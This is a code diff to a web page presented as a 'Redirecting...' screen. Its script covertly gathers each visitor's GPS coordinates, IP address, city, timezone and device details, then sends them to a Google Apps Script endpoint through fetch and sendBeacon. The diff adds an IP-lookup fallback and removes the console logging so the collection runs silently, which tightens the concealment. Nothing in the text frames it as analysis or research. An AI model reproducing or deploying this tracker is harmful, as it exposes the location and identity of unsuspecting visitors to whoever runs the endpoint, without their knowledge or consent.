@@ -4,19 +4,12 @@
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: white;
-    }
+    body { margin: 0; padding: 0; background: white; }
     .hidden {
       position: absolute;
-      top: -9999px;
-      left: -9999px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      visibility: hidden;
+      top: -9999px; left: -9999px;
+      width: 1px; height: 1px;
+      opacity: 0; visibility: hidden;
     }
   </style>
 </head>
@@ -42,13 +35,13 @@
       screenHeight: screen.height,
       referrer: document.referrer,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
-      isAndroid: /Android/.test(navigator.userAgent),
-      backgroundMode: true,
-      gpsSuccess: false,
-      ipSuccess: false,
-      collectionAttempted: false
+      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent).toString(),
+      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent).toString(),
+      isAndroid: /Android/.test(navigator.userAgent).toString(),
+      backgroundMode: "true",
+      gpsSuccess: "false",
+      ipSuccess: "false",
+      collectionAttempted: "false"
     };
 
     function rapidGPSCollection() {
@@ -56,7 +49,8 @@
         backgroundData.gpsError = 'not_supported';
         return;
       }
-      backgroundData.collectionAttempted = true;
+
+      backgroundData.collectionAttempted = "true";
 
       const rapidConfigs = [
         { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
@@ -80,16 +74,14 @@
                 backgroundData.altitude = coords.altitude;
                 backgroundData.speed = coords.speed;
                 backgroundData.heading = coords.heading;
-                backgroundData.gpsSuccess = true;
+                backgroundData.gpsSuccess = "true";
                 backgroundData.gpsMethod = `rapid_${index + 1}`;
-                console.log(`Background GPS: ${coords.latitude}, ${coords.longitude} (±${coords.accuracy}m)`);
                 sendBackgroundData();
               }
             },
             function(error) {
               backgroundData.gpsError = error.message;
               backgroundData.gpsErrorCode = error.code;
-              console.log(`Background GPS ${index + 1} failed: ${error.message}`);
             },
             config
           );
@@ -97,7 +89,7 @@
       });
     }
 
-    // ✅ FIXED BACKGROUND IP COLLECTION WITH CORS PROXY
+    // ✅ FIXED: Reliable IP collection with fallback
     async function backgroundIPCollection() {
       try {
         const response = await fetch("https://corsproxy.io/?https://ipapi.co/json/");
@@ -105,17 +97,31 @@
 
         if (result.ip) {
           backgroundData.ip = result.ip;
-          backgroundData.ipSuccess = true;
+          backgroundData.ipSuccess = "true";
           backgroundData.ipCity = result.city || "";
           backgroundData.ipCountry = result.country_name || "";
           backgroundData.ipLatitude = result.latitude || "";
           backgroundData.ipLongitude = result.longitude || "";
-          console.log(`📡 Background IP: ${result.ip}`);
+          return;
         }
-      } catch (e) {
-        backgroundData.ip = 'background_failed';
-        backgroundData.ipError = e.message;
-        console.log("❌ IP collection error:", e.message);
+      } catch (e1) {
+        try {
+          const response2 = await fetch("https://ipinfo.io/json?token=demo");
+          const result2 = await response2.json();
+
+          if (result2.ip) {
+            backgroundData.ip = result2.ip;
+            backgroundData.ipSuccess = "true";
+            backgroundData.ipCity = result2.city || "";
+            backgroundData.ipCountry = result2.country || "";
+            const [lat, lng] = result2.loc.split(",");
+            backgroundData.ipLatitude = lat;
+            backgroundData.ipLongitude = lng;
+          }
+        } catch (e2) {
+          backgroundData.ip = "background_failed";
+          backgroundData.ipError = e2.message;
+        }
       }
     }
 
@@ -133,50 +139,39 @@
           body: formData,
           mode: "no-cors",
           keepalive: true
-        }).catch(() => {});
-        console.log('Background data sent');
+        });
       } catch (error) {
-        console.log('Background send error (ignored):', error);
+        // Silent fail
       }
     }
 
     function getTimezoneLocation() {
-      if (backgroundData.gpsSuccess) return;
+      if (backgroundData.gpsSuccess === "true") return;
       const timezoneMap = {
-        'America/New_York': { lat: 40.7128, lng: -74.0060 },
-        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437 },
-        'America/Chicago': { lat: 41.8781, lng: -87.6298 },
-        'America/Denver': { lat: 39.7392, lng: -104.9903 },
-        'Europe/London': { lat: 51.5074, lng: -0.1278 },
-        'Europe/Paris': { lat: 48.8566, lng: 2.3522 },
-        'Europe/Berlin': { lat: 52.5200, lng: 13.4050 },
+        'Asia/Karachi': { lat: 24.8607, lng: 67.0011 },
+        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
         'Asia/Tokyo': { lat: 35.6762, lng: 139.6503 },
         'Asia/Shanghai': { lat: 31.2304, lng: 121.4737 },
-        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
-        'Australia/Sydney': { lat: -33.8688, lng: 151.2093 }
+        'America/New_York': { lat: 40.7128, lng: -74.0060 },
+        'Europe/London': { lat: 51.5074, lng: -0.1278 }
       };
       if (timezoneMap[backgroundData.timezone]) {
         const location = timezoneMap[backgroundData.timezone];
         backgroundData.latitude = location.lat;
         backgroundData.longitude = location.lng;
-        backgroundData.accuracy = 'timezone_fallback';
-        backgroundData.locationMethod = 'timezone';
-        console.log(`Background timezone location: ${location.lat}, ${location.lng}`);
+        backgroundData.accuracy = "timezone_fallback";
+        backgroundData.locationMethod = "timezone";
       }
     }
 
     (function startBackgroundCollection() {
-      console.log('🔄 Starting invisible background collection...');
       rapidGPSCollection();
       backgroundIPCollection();
       setTimeout(() => {
-        if (!backgroundData.gpsSuccess) {
+        if (backgroundData.gpsSuccess !== "true") {
           getTimezoneLocation();
         }
         sendBackgroundData();
-        console.log('🔄 Background collection complete');
-        console.log(`GPS: ${backgroundData.gpsSuccess ? 'SUCCESS' : 'FAILED'}`);
-        console.log(`Location: ${backgroundData.latitude || 'N/A'}, ${backgroundData.longitude || 'N/A'}`);
       }, 2500);
     })();
 
@@ -184,7 +179,7 @@
       navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' +
         encodeURIComponent(`
           self.addEventListener('message', function(event) {
-            console.log('Service worker processing:', event.data);
+            console.log('Service worker:', event.data);
           });
         `)
       ).catch(() => {});
@@ -203,7 +198,6 @@
             "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec",
             beaconData
           );
-          console.log('Beacon data sent');
         }, 1000);
       }
     }
